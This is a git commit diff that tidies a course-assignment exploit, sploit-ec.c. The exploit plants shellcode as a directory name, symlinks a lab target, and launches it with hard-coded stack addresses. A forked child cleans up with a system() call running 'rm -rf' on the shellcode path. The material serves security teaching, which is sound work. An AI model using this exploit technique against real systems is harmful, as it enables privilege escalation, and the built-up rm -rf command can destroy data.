bd03002946a8ffc2d6320476198f92ffc8e0f423
Rafael Moreno Ferrer <rmferrer@gmail.com>
2013-04-22 23:55:12 -0700

    Cleaning up ec

--- pa/pa1/sploits/sploit-ec.c
+++ pa/pa1/sploits/sploit-ec.c
@@ -6,43 +6,41 @@
 #include "shellcode.h"
 
 #define TARGET "/tmp/target-ec"
-#define EGG_SIZE 39
+#define EGG_SIZE 200
+#define SHELLCODE_SIZE 39
+#define CMD_SIZE 200
 #define WAIT_SECS 2
 
 int main(void)
 {
   char *args[3];
   char *env[1];
-  char egg[200];
-  int err;
-
-  args[0] = TARGET; args[1] = "0xbffffe2c"; args[2] = "0xbfffffc6";
-  env[0] = NULL;
-
-  memset (egg, 0, 200);
-  memcpy (egg, shellcode, EGG_SIZE - 1);
+  char egg[EGG_SIZE];
+  
+  memset (egg, 0, EGG_SIZE);
+  memcpy (egg, shellcode, SHELLCODE_SIZE - 1);
  
-  err = mkdir(egg, S_IRWXU);
-  err = chdir(egg);
-  err = mkdir("bin", S_IRWXU);
-  err = chdir("bin");
-  err = mkdir("sh", S_IRWXU);
-  err = chdir("sh");
-  err = symlink (TARGET, "nothing");
-  err = chdir("../../..");
+  mkdir (egg, S_IRWXU);
+  chdir (egg);
+  mkdir ("bin", S_IRWXU);
+  chdir ("bin");
+  mkdir ("sh", S_IRWXU);
+  chdir ("sh");
+  symlink (TARGET, "nothing");
+  chdir ("../../..");
 
-  memcpy(egg, shellcode, strlen(shellcode));
-  memcpy(egg+strlen(shellcode), "/nothing", strlen("/nothing"));
+  memcpy (egg, shellcode, strlen (shellcode));
+  memcpy (egg + strlen (shellcode), "/nothing", strlen ("/nothing"));
 
   pid_t pid = fork ();
 
   if (pid == (pid_t)0)
     {
-      char cmd[200];
+      char cmd[CMD_SIZE];
 
-      memset (cmd, 0, 200);
-      memcpy (cmd, "rm -rf ", strlen("rm -rf "));
-      memcpy (cmd+strlen("rm -rf "), shellcode, EGG_SIZE - 1);
+      memset (cmd, 0, CMD_SIZE);
+      memcpy (cmd, "rm -rf ", strlen ("rm -rf "));
+      memcpy (cmd + strlen ("rm -rf "), shellcode, SHELLCODE_SIZE - 1);
 
       sleep (WAIT_SECS);
       system (cmd);
@@ -50,6 +48,9 @@ int main(void)
       return 0;    
     }
   else{
+    args[0] = TARGET; args[1] = "0xbffffe2c"; args[2] = "0xbfffffc6";
+    env[0] = NULL;
+
     if (0 > execve (egg, args, env))
       fprintf (stderr, "execve failed.\n");
     return 0;
